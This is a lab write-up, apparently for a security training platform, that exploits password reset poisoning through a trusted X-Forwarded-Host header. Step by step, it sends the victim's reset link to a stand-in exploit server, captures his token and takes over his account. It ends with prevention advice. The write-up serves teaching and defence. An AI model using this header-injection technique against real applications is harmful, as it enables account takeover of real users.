# Lab: Password Reset Poisoning via Middleware

## Objective

Exploit the password reset functionality by poisoning the password reset link sent to Carlos, obtain his reset token, reset his password, and log in to his account.

---

## Vulnerability

The application trusts the following HTTP header:

```
X-Forwarded-Host
```

Instead of using the real Host header when generating password reset links.

An attacker can replace the host with a domain under his control, causing the victim's reset email to contain a malicious password reset URL.

---

## Phase 1 - Test the Vulnerability

Login using:

```
Username:
wiener

Password:
peter
```

Open:

```
Forgot Password
```

Capture:

```
POST /forgot-password
```

Send it to Repeater.

Add the following header:

```http
X-Forwarded-Host: exploit-xxxxxxxx.exploit-server.net
```

Send the request.

---

## Phase 2 - Verify the Reset Link

Open the email client from the Exploit Server.

The received email now contains:

```
https://exploit-xxxxxxxx.exploit-server.net/forgot-password?temp-forgot-password-token=...
```

Instead of the original application domain.

This confirms that the application is vulnerable to Password Reset Poisoning.

---

## Phase 3 - Target Carlos

Modify the request:

```
username=wiener
```

↓

```
username=carlos
```

Keep:

```http
X-Forwarded-Host: exploit-xxxxxxxx.exploit-server.net
```

Send the request.

---

## Phase 4 - Capture Carlos's Reset Token

Open:

```
Exploit Server
```

↓

```
Access Log
```

Carlos automatically clicks the malicious password reset link.

The request contains the reset token.

Example:

```
temp-forgot-password-token=qkzfz4od4glvahq0bpl7z6utlfj8j1uo
```

---

## Phase 5 - Reset Carlos's Password

Reuse the captured request.

Example:

```http
POST /forgot-password?temp-forgot-password-token=qkzfz4od4glvahq0bpl7z6utlfj8j1uo
```

Change:

```
new-password-1=123
new-password-2=123
```

Send the request.

Carlos's password is now changed.

---

## Phase 6 - Login

Login using:

```
Username:
carlos

Password:
123
```

Lab Solved ✅

---

## Why does this vulnerability exist?

The application generates password reset links using the client-controlled header:

```
X-Forwarded-Host
```

Instead of using the server's trusted hostname.

An attacker can therefore redirect password reset links to a malicious domain and steal the victim's reset token.

---

## Prevention

- Never trust client-controlled Host headers.
- Ignore X-Forwarded-Host unless coming from trusted reverse proxies.
- Generate password reset URLs using a server-side configured hostname.
- Validate forwarded headers before use.

---

## Tools Used

- Burp Suite
    - Proxy
    - Repeater
- Exploit Server

---

## Skills Learned

- Password Reset Poisoning
- Host Header Injection
- Middleware Abuse
- Reset Token Theft
- Account Takeover

---

## Real World Scenario

Applications behind reverse proxies sometimes trust:

```
X-Forwarded-Host
```

to generate password reset links.

If this header is not validated, attackers can poison password reset emails and steal reset tokens when victims click the malicious links.

---

## Key Takeaway

**Never generate password reset links using client-controlled Host headers. Password reset URLs should always be built from trusted server-side configuration.**
